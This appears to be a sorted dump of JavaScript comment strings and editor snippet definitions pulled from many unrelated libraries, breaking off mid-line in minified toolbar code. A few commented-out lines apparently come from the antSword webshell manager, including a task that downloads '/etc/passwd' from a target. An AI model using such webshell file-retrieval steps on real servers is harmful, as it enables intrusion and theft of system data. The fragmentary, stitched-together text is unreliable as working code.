console.log (Firebug)\nsnippet cl\n	console.log(${1});\n# return\nsnippet ret\n	return ${1:result}\n# for (property in object ) { ... }\nsnippet fori\n	for (var ${1:prop} in ${2:Things}) {\n		${0:$2[$1]}\n	}\n# hasOwnProperty\nsnippet has\n	hasOwnProperty(${1})\n# docstring\nsnippet /**\n	/**\n	 * ${1:description}\n	 *\n	 */\nsnippet @par\nregex /^\\s*\\*\\s*/@(para?m?)?/\n	@param {${1:type}} ${2:name} ${3:description}\nsnippet @ret\n	@return {${1:type}} ${2:description}\n# JSON.parse\nsnippet jsonp\n	JSON.parse(${1:jstr});\n# JSON.stringify\nsnippet jsons\n	JSON.stringify(${1:object});\n# self-defining function\nsnippet sdf\n	var ${1:function_name} = function(${2:argument}) {\n		${3:// initial code ...}\n\n		$1 = function($2) {\n			${4:// main code}\n		};\n	}\n# singleton\nsnippet sing\n	function ${1:Singleton} (${2:argument}) {\n		// the cached instance\n		var instance;\n\n		// rewrite the constructor\n		$1 = function $1($2) {\n			return instance;\n		};\n		\n		// carry over the prototype properties\n		$1.prototype = this;\n\n		// the instance\n		instance = new $1();\n\n		// reset the constructor pointer\n		instance.constructor = $1;\n\n		${3:// code ...}\n\n		return instance;\n	}\n# class\nsnippet class\nregex /^\\s*/clas{0,2}/\n	var ${1:class} = function(${20}) {\n		$40$0\n	};\n	\n	(function() {\n		${60:this.prop = """"}\n	}).call(${1:class}.prototype);\n	\n	exports.${1:class} = ${1:class};\n# \nsnippet for-\n	for (var ${1:i} = ${2:Things}.length; ${1:i}--; ) {\n		${0:${2:Things}[${1:i}];}\n	}\n# for (...) {...}\nsnippet for\n	for (var ${1:i} = 0; $1 < ${2:Things}.length; $1++) {\n		${3:$2[$1]}$0\n	}\n# for (...) {...} (Improved Native For-Loop)\nsnippet forr\n	for (var ${1:i} = ${2:Things}.length - 1; $1 >= 0; $1--) {\n		${3:$2[$1]}$0\n	}\n\n\n#modules\nsnippet def\n	define(function(require, exports, module) {\n	""use strict"";\n	var ${1/.*\\///} = require(""${1}"");\n	\n	$TM_SELECTED_TEXT\n	});\nsnippet req\nguard ^\\s*\n	var ${1/.*\\///} = require(""${1}"");\n	$0\nsnippet requ\nguard ^\\s*\n	var ${1/.*\\/(.)/\\u$1/} = require(""${1}"").${1/.*\\/(.)/\\u$1/};\n	$0\n',t.scope=""javascript""});                (function() {"
"// body...}\n	}\n\n# Function\nsnippet fun\n	function ${1?:name}(${2:argument}) {\n		return ${3:// body...}\n	}\n\n# Repeat\nsnippet rep\n	repeat ${1?:times} {\n		${2:// body...}\n	}\n\n# For\nsnippet for\n	foreach ${1?:e} in ${2?:list} {\n		${3:// body...}	\n	}\n\n# If\nsnippet if\n	if (${1?:condition}) {\n		${3:// body...}	\n	}\n\n# While\n  while (${1?:condition}) {\n    ${2:// body...}	\n  }\n"",t.scope=""gobstones""});                (function() {"
"// body}\n# Array comprehension\nsnippet fora\n	for ${1:name} in ${2:array}\n		${3:// body...}\n# Object comprehension\nsnippet foro\n	for ${1:key}, ${2:value} of ${3:object}\n		${4:// body...}\n# Range comprehension (inclusive)\nsnippet forr\n	for ${1:name} in [${2:start}..${3:finish}]\n		${4:// body...}\nsnippet forrb\n	for ${1:name} in [${2:start}..${3:finish}] by ${4:step}\n		${5:// body...}\n# Range comprehension (exclusive)\nsnippet forrex\n	for ${1:name} in [${2:start}...${3:finish}]\n		${4:// body...}\nsnippet forrexb\n	for ${1:name} in [${2:start}...${3:finish}] by ${4:step}\n		${5:// body...}\n# Function\nsnippet fun\n	(${1:args}) ->\n		${2:// body...}\n# Function (bound)\nsnippet bfun\n	(${1:args}) =>\n		${2:// body...}\n# Class\nsnippet cla class ..\n	class ${1:`substitute(Filename(), '\\(_\\|^\\)\\(.\\)', '\\u\\2', 'g')`}\n		${2}\nsnippet cla class .. constructor: ..\n	class ${1:`substitute(Filename(), '\\(_\\|^\\)\\(.\\)', '\\u\\2', 'g')`}\n		constructor: (${2:args}) ->\n			${3}\n\n		${4}\nsnippet cla class .. extends ..\n	class ${1:`substitute(Filename(), '\\(_\\|^\\)\\(.\\)', '\\u\\2', 'g')`} extends ${2:ParentClass}\n		${3}\nsnippet cla class .. extends .. constructor: ..\n	class ${1:`substitute(Filename(), '\\(_\\|^\\)\\(.\\)', '\\u\\2', 'g')`} extends ${2:ParentClass}\n		constructor: (${3:args}) ->\n			${4}\n\n		${5}\n# If\nsnippet if\n	if ${1:condition}\n		${2:// body...}\n# If __ Else\nsnippet ife\n	if ${1:condition}\n		${2:// body...}\n	else\n		${3:// body...}\n# Else if\nsnippet elif\n	else if ${1:condition}\n		${2:// body...}\n# Ternary If\nsnippet ifte\n	if ${1:condition} then ${2:value} else ${3:other}\n# Unless\nsnippet unl\n	${1:action} unless ${2:condition}\n# Switch\nsnippet swi\n	switch ${1:object}\n		when ${2:value}\n			${3:// body...}\n\n# Log\nsnippet log\n	console.log ${1}\n# Try __ Catch\nsnippet try\n	try\n		${1}\n	catch ${2:error}\n		${3}\n# Require\nsnippet req\n	${2:$1} = require '${1:sys}'${3}\n# Export\nsnippet exp\n	${1:root} = exports ? this\n"",t.scope=""coffee""});                (function() {"
"// boolean indicating whether this is a block (`/* */`) comment,"
"// border-box includes padding, so remove it if we want content"
"// bounds check now, because the read streams will probably not complain loud enough."
"// bpath = bpath.replace(/\\/g,'/'); if(!bpath.endsWith('/')) {   bpath += '/';"
"// brace, it's an ExpressionStatement or LabeledStatement. We"
"// browsers typically do this as necessary, jsdom doesn't."
"// buffer, and the EOF has been seen at this point, then make sure"
"// buffer."""
"// buffered up.  When you call read(), that calls _read(n) until"
"// buffers. In case the last one or two byte in last buffer is not complete, we"
"// but a symlink to a directory, using an 8.3 shortname, can evade"
"// but for now, just use the version from blink. This file is copied from"
"// but not including, the right-most %x2F (""/"")."""
"// but note that everything is flipped for the ""ltr"" function."
"// but note that it must be THE SAME object, not"
"// but since 53 bits is a whole lot more than 32 bits, we do our best anyway."
"// but still try to close, and report closing errors if they occur."
"// but that's not a great name for it, since that implies a thing where"
"// but we should not, see #8335."
"// by default only buffer text/*, json and messed up thing from hell"
"// bytes of output.  Writing the 4 bytes {ff,ff,ff,ff} would result in"
"// bytes, but CESU-8 may require up to 6 (3 bytes per surrogate)."
"// c < 3*dvalue, x < 2*dvalue, this_i < dvalue"
"// c is initial carry, returns final carry."
"// c, d"
"// c. If resolved is equal to undefined, continue the loop."
"// c. If resolved is not null or undefined, return resolved."
"// c. If target split on ""/"" or ""\"" contains any ""."", "".."" or ""node_modules"" segments after the first segment, case insensitive"
"// c. If the folder at packageURL does not exist, then"
"// c. Otherwise if exports is an Object containing a ""."" property, then"
"// c. Return the result of PACKAGE_TARGET_RESOLVE(packageURL, target, subpath, true, isImports, conditions)."
"// c. THROW ""not found"""
"// caching class name results and not detecting when changed,"
"// call cb(er, data) where data is <= n in length."
"// call_order now equals ['one','two']"
"// callback function onto this.stack, then call the callback with a"
"// callback is undefined, will return a cursor"
"// callback returns a truthy value. Like Array.prototype.some, the final"
"// called when `lastModified` is set, and a ""cache"" stream was provided"
"// called, and that is sufficient for our purpose. No need to flood the logs"
"// called, the error will be emitted via nextTick, and"
"// calling maybeReprint again, but that would be a mistake"
"// calls push on internal array, then manually adds indexed property to dtl"
"// calls, because qs.stringify unconditionally encodes backticks."
"// camelCase, specialEasing and expand cssHook pass"
"// can be confused by) options.sourceFileName, so we null it out."
"// can be if for following, preceding"
"// can be used to identify node types, as well as Expression and"
"// can be used to identify node types, as well as Expression,"
"// can come up with an optimistic estimate, however, by assuming that"
"// canonicalize the hostname, so that 'oogle.com' won't match 'google.com'"
"// capturing group, because it should not ever be used in version"
"// careful, this is based on buffer and has its own pointer (this.pointer != pointer) and inner chars"
"// careful, uninitialized memory!"
"// case is makes sense to regard them as equivalent, if not ===."
"// case, which will result in a ""00"" `matchedCount` that differs from `i` but is also"
"// case-sensitive match, this has changed from previous specifications"
"// catch them here, at initialization time, instead."
"// category counters, each interger counts sequence in its category"
"// cause Acorn to call that function with `(block, text, start,"
"// cell.fixSize(1, 0);"
"// chaining order is applied to methods with DEFINE_MANY policy, whether"
"// character found at the end of the buffer is buffered up, and will be"
"// character of the cookie-path is %x2F (""/"")."""
"// characters and character ranges, throw an INVALID_CHARACTER_ERR"
"// characters it is given as second argument, and returns a token"
"// charset identified, either ""windows-1255"" or ""ISO-8859-8""."
"// chart_1.load('./data/chart.xml', 'xml');"
"// check for Mutation Events, DOMAttrModified should be"
"// check for a 3xx ""redirect"" status code on the previous cache"
"// check for a 3xx ""redirect"" status code"
"// check if a thing is there, and if so, try to clobber it"
"// check if fn is first in line for all its paths, and is"
"// check if the cache is the same ""data:"" URI that was previously passed in."
"// check that the generated one is not empty, first remove the property"
"// check, but we can offer a more precise error message here rather than"
"// checked=""checked"" or checked"
"// checking whether the root is a prefix of the path won't work. Instead, we"
"// child Path object, for both performance and consistency reasons."
"// class initializer - no JIT !! one time setup\n			if Cababilities.os == ""Linux|MacOS"" {\n				FOO = ""other"";\n			}\n\n			// constructor:\n			public function $2 (	){\n				super2();\n				trace(""start"");\n			}\n			public function name (a, b...){\n				super.name(..);\n				lable:break\n			}\n		}\n	}\n\n	function A(){\n		// A can only be accessed within this file\n	}\nsnippet switch\n	switch(${1}){\n		case ${2}:\n			${3}\n		break;\n		default:\n	}\nsnippet case\n		case ${1}:\n			${2}\n		break;\nsnippet package\n	package ${1:package}{\n		${2}\n	}\nsnippet wh\n	while ${1:cond}{\n		${2}\n	}\nsnippet do\n	do {\n		${2}\n	} while (${1:cond})\nsnippet while\n	while ${1:cond}{\n		${2}\n	}\nsnippet for enumerate names\n	for (${1:var} in ${2:object}){\n		${3}\n	}\nsnippet for enumerate values\n	for each (${1:var} in ${2:object}){\n		${3}\n	}\nsnippet get_set\n	function get ${1:name} {\n		return ${2}\n	}\n	function set $1 (newValue) {\n		${3}\n	}\nsnippet interface\n	interface name {\n		function method(${1}):${2:returntype};\n	}\nsnippet try\n	try {\n		${1}\n	} catch (error:ErrorType) {\n		${2}\n	} finally {\n		${3}\n	}\n# For Loop (same as c.snippet)\nsnippet for for (..) {..}\n	for (${2:i} = 0; $2 < ${1:count}; $2${3:++}) {\n		${4:/* code */}\n	}\n# Custom For Loop\nsnippet forr\n	for (${1:i} = ${2:0}; ${3:$1 < 10}; $1${4:++}) {\n		${5:/* code */}\n	}\n# If Condition\nsnippet if\n	if (${1:/* condition */}) {\n		${2:/* code */}\n	}\nsnippet el\n	else {\n		${1}\n	}\n# Ternary conditional\nsnippet t\n	${1:/* condition */} ? ${2:a} : ${3:b}\nsnippet fun\n	function ${1:function_name}(${2})${3}\n	{\n		${4:/* code */}\n	}\n# FlxSprite (usefull when using the flixel library)\nsnippet FlxSprite\n	package\n	{\n		import org.flixel.*\n\n		public class ${1:ClassName} extends ${2:FlxSprite}\n		{\n			public function $1(${3: X:Number, Y:Number}):void\n			{\n				super(X,Y);\n				${4: //code...}\n			}\n\n			override public function update():void\n			{\n				super.update();\n				${5: //code...}\n			}\n		}\n	}\n\n',t.scope=""actionscript""});                (function() {"
"// close -- if it's still set to true in the finally block, it means"
"// closeHtml: '<button>&times;</button>',"
"// collapsed to a single letter identifier.  To work around this, you can"
"// colon is simply omitted, as in ""file:///c/tmp/test.txt""."
"// comment comes after it. These two fields should not both be true,"
"// comments, but it doesn't hurt for Line comments."
"// comments, we delete oldNode's comments, print newPath"
"// comments, wrap the original Program node with a File node."
"// commit https://github.com/nodejs/node/commit/5e3f5164, the flush"
"// compare(max, v, true)"
"// compare(min, v, true)"
"// compile nested selectors, DO NOT pass the callback parameter"
"// compiler will add this to ""source"""
"// complex values such as ""rotate(1rad)"" are returned as-is."
"// comprised of xranges, tildes, stars, and gtlt's at this point."
"// concurrency is optional, shift the args."
"// connect, bind, associate"
"// console.log('\n\n\n *** \n', JSON.stringify(sourceCode));"
"// console.log('___ %s ___', path.node.operator);"
"// const METHODS = new Set(['GET', 'PUT', 'HEAD', 'DELETE', 'OPTIONS', 'TRACE']);"
"// const conf = antSword['ipcRenderer'].sendSync('shell-getDataConf', {"
"// const hash = (+new Date * Math.random()).toString(16).substr(2, 8);"
"// const task = tasks.new('download', '/etc/passwd', '0%'); task.update('20%');"
"// constant across these operations, so a shallow copy should be returned."
"// constructor, assume from is a binary predicate function we can"
"// constructor, but we can more efficiently stuff them into the secret and"
"// consuming the stream.  So, we don't emit('end') until some reading"
"// contains 12 bits, discard the last four and interpret the remaining"
"// contention to be starved of CPU by node, so the contention doesn't resolve."
"// contents, but here we echo the behavior of the real SIZE and"
"// context (optional): If specified, the fragment will be created in this context,"
"// contextual keyword (identifier) in non-strict mode, so we need to"
"// continuation byte. If an invalid byte is detected, -2 is returned."
"// control flow functions, use the `retryable` wrapper:"
"// convert it to a string literal, otherwise it will be decoded"
"// convert this encoding string to a number, here called order."
"// cookie-av."""
"// cookie-string is being generated for a ""non-HTTP"" API"""
"// copy object to avoid the use of references, because web authors often reuse attObj for multiple SWFs"
"// copy object to avoid the use of references, because web authors often reuse flashvarsObj for multiple SWFs"
"// copy object to avoid the use of references, because web authors often reuse parObj for multiple SWFs"
"// core-js workaround, pre-v2.5.0"
"// corresponding key, and an identical 'prototype' property. Note: this"
"// could be empty line, just skip it"
"// could not parse, so at least give the end user a chance to"
"// could still be a color, one of the standard keyword colors"
"// count the one we are adding, as well."
"// create a new export function, used by both the main export and"
"// create the ""key"" for the LRU cache"
"// create, and consume so much memory, that the browser appears frozen."
"// created files.  Try again on failure, for up to 60 seconds."
"// created while scanning the catch body, ignore it because it"
"// credentials: { accessKeyId, secretAccessKey, [sessionToken] }"
"// ctrlKey && altKey is equivalent to AltGr, and is not a command."
"// currentNode.compareKeys(key, currentNode.key) is > 0"
"// currently works, but converting a String to a Buffer (via `new Buffer`, or"
"// custom comparator function, calling back and forth between the VM's C++ and"
"// custom types to the AST type system (in particular, the File type), but"
"// d. If mainExport is not undefined, then"
"// data will be [1,2,3,4,5,6] in the above callback"
"// dataTypeExpression is optional and defaults to ""*"""
"// data[0] = { divider:true },[1]={ header:'headr',href:'#', target:'_blank',disabled:true,icon:'fa fa-xxoo',text:'xxx',count:111,id:'test',action:function,subMenu:[same as ..] }"
"// declaration, e.g. <!DOCTYPE html>"
"// declare themselves as anonymous modules, and avoid setting a global if an"
"// decodeTables is a trie, encoded as an array of arrays of integers. Internal arrays are trie nodes and all have len = 256."
"// decorators, their locations might contribute to the true start/end"
"// decrement both remain and blockRemain by bytesRead, and know that we"
"// deeply than the node itself, reconsider it as trailing."
"// deeply ugly to write APIs this way, but that still doesn't mean"
"// def/esprima.js. In the future, it will be possible to load only one set"
"// default flash text duration, used for temporarily changing text of an element"
"// default value to be destructured against the left-hand side, if no"
"// define those methods on the function objects themselves, rather than"
"// definitely a prefix, definitely >130 chars."
"// definition of the ""id"" field in the Function interface."
"// delete the renamed file.  It's a sloppy kludge, but frankly, I do not"
"// delete, void, typeof"
"// deleting text, so we ignore its input events."
"// deprecated, set in defaults object"
"// derived from file names, and jQuery is normally delivered in a lowercase"
"// dest exists and is a regular file or directory,"
"// destroy(err, cb) is a private API"
"// destructuring), the entire pattern is recursively checked."
"// detect native getAttribute/hasAttribute methods,"
"// dictates that e.g. i++, j++ should not be wrapped with"
"// did it), otherwise encode params recursively."
"// didn't find it.  we already failed for strict, so just abort."
"// didn't get any data, stop spinning."
"// disk, without asking the kernel for a shortname."
"// distribute, sublicense, and/or sell copies of the Software, and to permit"
"// distributed under the License is distributed on an ""AS IS"" BASIS,"
"// divs do not seem to expose properties, triggering a ""Permission denied"
"// divs"", e.g. the up/down buttons on an <input type=""number"">. Anonymous"
"// do nothing, handled in the compiler where"
"// doWrite is almost always async, defer these to save a bit of time"
"// doc1 = { _id: 'id1', planet: 'Mars', system: 'solar', inhabited: false, satellites: ['Phobos', 'Deimos'] }"
"// doc2 = { _id: 'id2', planet: 'Earth', system: 'solar', inhabited: true, humans: { genders: 2, eyes: true } }"
"// doc3 = { _id: 'id3', planet: 'Jupiter', system: 'solar', inhabited: false }"
"// doc4 = { _id: 'id4', planet: 'Omicron Persei 8', system: 'futurama', inhabited: true, humans: { genders: 7 } }"
"// docs contains Mars, Jupiter, Omicron Persei 8"
"// docs contains Omicron Persei 8, whose humans have more than 5 genders (7)."
"// docs is [doc1, doc3, doc2]"
"// docs is [doc3, doc1]"
"// docs is [{ inhabited: false, satellites: ['Phobos', 'Deimos'] }]"
"// docs is [{ planet: 'Mars', system: 'solar' }]"
"// docs is [{ planet: 'Mars', system: 'solar', _id: 'id1' }]"
"// docs is an array containing documents Mars, Earth, Jupiter"
"// docs is empty, because { genders: 2 } is not equal to { genders: 2, eyes: true }"
"// document, and doc's effective script origin is an alias to the effective"
"// does not allow items to be added, only removed, so splice-lite"
"// does not use listeners(), so no side effect of creating _events[type]"
"// doesn't fire when text is deleted, but conveniently, selectionchange"
"// doesn't give us keycodes, so we need to blacklist it."
"// doesn't, we manually listen for the events and so we have to enqueue and"
"// domain names. Each label must be between 1 and 63 characters long, and the"
"// domain, and path as the newly created cookie:"""
"// don't bother to make the parent if the current entry is the cwd,"
"// don't have that much.  return null, unless we've ended."
"// don't have to do de-duping because children have parent,"
"// don't need them anymore, and they create cycles in the AST that"
"// don't remove if it's the cwd, since we want that error."
"// don't remove if the cwd, we want that error"
"// drop any prereleases that might already exist, since they are not"
"// e. If pjson is not null and pjson.exports is not null or undefined, then"
"// e.g ""a.b.c"".indexOf(""b.c"") === 2"
"// e.g. ""com"""
"// e.g. for streaming directly from a remote server,"
"// e.g. options.readableObjectMode vs. options.writableObjectMode, etc."
"// e.g. { 30: ['userId1', 'userId3'], 42: ['userId2']};"
"// edge case, result in creating at most one complete copy of the string passed in."
"// eight as an 8-bit big-endian number. If it contains 18 bits, discard the"
"// either ""single"", ""double"", or ""auto"" here (""auto"" will select the one"
"// either 3, 5, 6 (or 2015), 7 (2016), 8 (2017), 9 (2018), 10"
"// either a /, ?, !, or text is coming next."
"// either a string attribute to count by, or a function that returns the"
"// element match selector, return boolean true/false"
"// element, in case the parser accidentally decided to include it."
"// element, we disallow it here in the parser in order to provide a"
"// elements instead of directly on the input). Without this, controlled"
"// elements matching selector, starting from element"
"// elements that are less than or equal to the pivot to the before it, and"
"// elsewhere), except it returns a Date"
"// empty."""
"// enabled, it is given the location as a `{line, column}` object"
"// enabled: Buffer.from(editor.session.getValue()).toString('base64') != _ ,"
"// encode returns `true` if a pax extended header is needed, because"
"// encode: conf['encode'],"
"// encodeURIComponent('&#10003;'), the ""numeric entity"" representation of a checkmark"
"// encoders[farr[0]].push(farr[1].slice(0,-3));   }); } default"
"// encoding is supported in this case, so"
"// encountered, then it's strict."
"// end of the original subtree for this reprinting, then we"
"// end on a partial character, we simply let v8 handle that."
"// end]` array with the same numbers, set the `ranges` option to"
"// enough, specially when dealing with files mostly with numbers."
"// ensure ""match"" is not null or empty since"
"// entries that are only a length of 2 are from an older version, don't"
"// entry, or push it into the active entry.  The ReadEntry class knows"
"// environmental variables (NO_PROXY, HTTP_PROXY, etc.)"
"// equal to those numbers to output, in the same order, and then empty"
"// equals `i`), unless we didn't visit _any_ elements in the above loop because we have"
"// equivalent to `new String(""5"")`."
"// err is the error message, docs is undefined"
"// err.message, err.response"
"// error"" if any of its properties are accessed. The only seemingly possible"
"// error, so assume unsupported"
"// error.message === ""2"""
"// es2017 example, though `asyncify` is not needed if your JS environment"
"// eslint-disable-line no-restricted-syntax, no-continue"
"// eslint-disable-line no-restricted-syntax, no-unreachable-loop"
"// eslint-disable-next-line no-implicit-coercion, no-extra-parens"
"// eslint-disable-next-line no-unused-expressions, no-caller, no-restricted-properties"
"// even it iterator ""returns"" in the same event loop"
"// even, though, which allows us to return the root value in constant time"
"// event handlers, because event handlers can modify the DOM, leading to"
"// events is still used, but was moved to jQuery.event.stopPropagation function"
"// example legally end with a Non-Final Pe or Kaf. However, the benefit of"
"// example: #{hex::str} = hex(str), #{arg1} = arg1"
"// except ""table"", ""table-cell"", or ""table-caption"""
"// exception if _P_ did not conform to the grammar, if any elements of _P_"
"// expiryDate() replaces the ""expiry-time"" parts of S5.3 step 3 (setCookie()"
"// expiryTime() replaces the ""expiry-time"" parts of S5.3 step 3 (setCookie()"
"// explicitly match decimal, hex, and named HTML entities"
"// explicitly, so if they blow away the cwd, c'est la vie."
"// export * from ""foo"";"
"// export the public API for CommonJS implementations,"
"// export { x, y as z } [from '...']"
"// export {default} from ""foo"";"
"// export {default} from ""something"";"
"// export {foo} from ""foo"";"
"// exposes that same interface as `parse`, but will try to parse"
"// expression, an expression started by a keyword like `function` or"
"// expression, so we might have to un-lex() it later by"
"// expressions in the head of for loops, traditional style"
"// extended interface (item, key, callback)"
"// extension, and skip it."
"// extra can be a number, shortcut for increasing-calling-decreasing"
"// extract ciphertext from json object, and create cipher params object"
"// f. If subpath split on ""/"" or ""\"" contains any ""."", "".."" or ""node_modules"" segments, case insensitive and including percent"
"// f. Otherwise, if packageSubpath is equal to ""."", then"
"// fact by caching the parsed variable length fields of each segment,"
"// fact some kind of Hebrew, Logical or Visual. The final decision about which"
"// fact, only Expression nodes) need parentheses."
"// fact, when sorting with a comparator, these costs outweigh the benefits of"
"// failures. Also, take care to yield the scheduler. Windows scheduling gives"
"// faster than JS when doing raw CPU-intensive sorting. However, when using a"
"// favor of getInitialState. Alternatively, we can disallow"
"// figure out if we want socks v4 or v5, based on the ""protocol"" used."
"// file entry with an identical name, and you cannot re-use the file"
"// file:///, etc.), one or more slashes (/), or simply nothing at all, we"
"// files are deleted, resulting in spurious ENOTEMPTY errors."
"// files that may use define, but not via a proper concatenation script that"
"// fill in the blanks for any periods that didn't trigger, such as"
"// filters are bog-slow, so only create them if abbsolutely necessary"
"// finally, initiate the WebSocket connection"
"// first <Buffer > in state.buffer), and we'll end up here."
"// first element match only, return element or null"
"// first node is sentinel, second node is root element"
"// first set prefix to the dir, and path to the base"
"// first write, might be gzipped"
"// first, causing a confusing mess."
"// first, check desired error"
"// fixed, the key warnings will appear.)"
"// flowing needs to be set to true now, otherwise"
"// fn => {paths, dirs}"
"// fn => {paths:[path,...], dirs:[path, ...]}"
"// focus(in | out) events fire after focus & blur events,"
"// followed by ""( non-digit *OCTET )"" so therefore the last time-field can"
"// foo() is deprecated, use bar() instead"
"// for Cache-Control rules, see: http://www.mnot.net/cache_docs/#CACHE-CONTROL"
"// for Closure Compiler ""advanced"" mode."
"// for Expires rules, see: http://www.mnot.net/cache_docs/#EXPIRES"
"// for GB2312 encoding, we are interested"
"// for Windows, we need to invert the path separators from what a URI uses"
"// for big5 encoding, we are interested"
"// for euc-JP encoding, we are interested"
"// for euc-KR encoding, we are interested"
"// for euc-TW encoding, we are interested"
"// for example, if the socket was destroyed due to an error. Ensure that the"
"// for most AWS services, aws4 can figure out the service and region if you pass a host"
"// for node-sets, map id over each node value."
"// for now, work with hex strings because they're easier in JS"
"// for our use case, at the expense of conforming to the adler32 specification"
"// for readable, but we still have to call"
"// for sjis encoding, we are interested"
"// for some, but which we are not interested in as it slows us down."
"// for strict mode, the set of reserved words, and support for"
"// for string, boolean, number and null"
"// for virtual (non-string, non-buffer) streams, ""length"" is somewhat"
"// for which stopPropagation() is noop, so there is no need for that anymore."
"// force the \ to / normalization, since we might not *actually*"
"// form, etc). We start by wrapping dispatchEvent so we can forward events to"
"// format the proxy info back into a URI, since an opts object"
"// frameworks extend these to elements, but it seems"
"// from DOM nodes, so set to undefined instead"
"// from MDN, handle object having an `hasOwnProperty` prop"
"// from byte's class and stateTable, we get its next state"
"// fs throws error anyway, so no need to guard against it here."
"// fs.lchown, which would always try to call fs.open on a directory"
"// fs.readdirSync(path.join(process.env.AS_WORKDIR,'encoder'),(err,f) => {"
"// fs.write(fd, buffer[, offset[, length[, position]]], callback)"
"// fs.write(fd, string[, position[, encoding]], callback)"
"// function (str: string, schema: object): string {}"
"// function dhtmlXToolbarObject(c,e){var a=this;this.conf={skin:(e||window.dhx4.skin||(typeof(dhtmlx)!=""undefined""?dhtmlx.skin:null)||window.dhx4.skinDetect(""dhxtoolbar"")||""dhx_skyblue""),align:""left"",align_autostart:""left"",icons_path:"""",iconSize:18,sel_ofs_x:0,sel_ofs_y:0,xml_autoload:null,items_autoload:null};if(typeof(c)==""object""&&c!=null&&typeof(c.tagName)==""undefined""){if(c.icons_path!=null||c.icon_path!=null){this.conf.icons_path=(c.icons_path||c.icon_path)}if(c.icons_size!=null){this.conf.icons_size_autoload=c.icons_size}if(c.json!=null){this.conf.json_autoload=c.json}if(c.xml!=null){this.conf.xml_autoload=c.xml}if(c.onload!=null){this.conf.onload_autoload=c.onload}if(c.onclick!=null||c.onClick!=null){this.conf.auto_onclick=(c.onclick||c.onClick)}if(c.items!=null){this.conf.items_autoload=c.items}if(c.skin!=null){this.conf.skin=c.skin}if(c.align!=null){this.conf.align_autostart=c.align}c=c.parent}this.cont=(typeof(c)!=""object"")?document.getElementById(c):c;while(this.cont.childNodes.length>0){this.cont.removeChild(this.cont.childNodes[0])}c=null;this.cont.dir=""ltr"";this.base=document.createElement(""DIV"");this.base.className=""dhxtoolbar_float_left"";this.cont.appendChild(this.base);if(window.dhx4.isIPad){this.cont.ontouchstart=function(g){g=g||event;if((String(g.target.tagName||"""").toLowerCase()==""input"")){return true}if(g.preventDefault){g.preventDefault()}else{g.returnValue=false}g.cancelBubble=true;return false}}this.setSkin(this.conf.skin);this.objPull={};this.anyUsed=""none"";this._genStr=function(g){var h=""dhxId_"";var m=""abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"";for(var l=0;l<g;l++){h+=m.charAt(Math.round(Math.random()*(m.length-1)))}return h};this.rootTypes=new Array(""button"",""buttonSelect"",""buttonTwoState"",""separator"",""label"",""slider"",""text"",""buttonInput"");this.idPrefix=this._genStr(12);window.dhx4._enableDataLoading(this,""_initObj"",""_xmlToJson"",""toolbar"",{struct:true});window.dhx4._eventable(this);this._getObj=function(m,g){var h=null;for(var l=0;l<m.childNodes.length;l++){if(m.childNodes[l].tagName!=null){if(String(m.childNodes[l].tagName).toLowerCase()==String(g).toLowerCase()){h=m.childNodes[l]}}}return h};this._addImgObj=function(h){var g=document.createElement(""IMG"");if(h.childNodes.length>0){h.insertBefore(g,h.childNodes[0])}else{h.appendChild(g)}return g};this._setItemImage=function(m,h,g){if(g==true){m.imgEn=h}else{m.imgDis=h}if((!m.state&&g==true)||(m.state&&g==false)){return}var l=this._getObj(m.obj,""img"");if(l==null){l=this._addImgObj(m.obj)}l.src=this.conf.icons_path+h};this._clearItemImage=function(l,g){if(g==true){l.imgEn=""""}else{l.imgDis=""""}if((!l.state&&g==true)||(l.state&&g==false)){return}var h=this._getObj(l.obj,""img"");if(h!=null){h.parentNode.removeChild(h)}};this._setItemText=function(g,l){var h=this._getObj(g.obj,""div"");if(l==null||l.length==0){if(h!=null){h.parentNode.removeChild(h)}return}if(h==null){h=document.createElement(""DIV"");h.className=""dhxtoolbar_text"";g.obj.appendChild(h)}h.innerHTML=l};this._getItemText=function(g){var h=this._getObj(g.obj,""div"");if(h!=null){return h.innerHTML}return""""};this._enableItem=function(h){if(h.state){return}h.state=true;if(this.objPull[h.id][""type""]==""buttonTwoState""&&this.objPull[h.id][""obj""][""pressed""]==true){h.obj.className=""dhx_toolbar_btn dhxtoolbar_btn_pres"";h.obj.renderAs=""dhx_toolbar_btn dhxtoolbar_btn_over""}else{h.obj.className=""dhx_toolbar_btn dhxtoolbar_btn_def"";h.obj.renderAs=h.obj.className}if(h.arw){h.arw.className=String(h.obj.className).replace(""btn"",""arw"")}var g=this._getObj(h.obj,""img"");if(h.imgEn!=""""){if(g==null){g=this._addImgObj(h.obj)}g.src=this.conf.icons_path+h.imgEn}else{if(g!=null){g.parentNode.removeChild(g)}}};this._disableItem=function(h){if(!h.state){return}h.state=false;h.obj.className=""dhx_toolbar_btn dhxtoolbar_btn_""+(this.objPull[h.id][""type""]==""buttonTwoState""&&h.obj.pressed?""pres_"":"""")+""dis"";h.obj.renderAs=""dhx_toolbar_btn dhxtoolbar_btn_def"";if(h.arw){h.arw.className=String(h.obj.className).replace(""btn"",""arw"")}var g=this._getObj(h.obj,""img"");if(h.imgDis!=""""){if(g==null){g=this._addImgObj(h.obj)}g.src=this.conf.icons_path+h.imgDis}else{if(g!=null){g.parentNode.removeChild(g)}}if(h.polygon!=null){if(h.polygon.style.display!=""none""){window.dhx4.zim.clear(h.polygon._idd);h.polygon.style.display=""none"";if(h.polygon._ie6cover){h.polygon._ie6cover.style.display=""none""}if(this.conf.skin==""dhx_terrace""){this._improveTerraceButtonSelect(h.id,true)}}}this.anyUsed=""none""};this.clearAll=function(){for(var g in this.objPull){this._removeItem(String(g).replace(this.idPrefix,""""))}};this._doOnClick=function(g){if(a&&a.forEachItem){a.forEachItem(function(l){if(a.objPull[a.idPrefix+l][""type""]==""buttonSelect""){var h=a.objPull[a.idPrefix+l];if(h.arw._skip===true){h.arw._skip=false}else{if(h.polygon.style.display!=""none""){h.obj.renderAs=""dhx_toolbar_btn 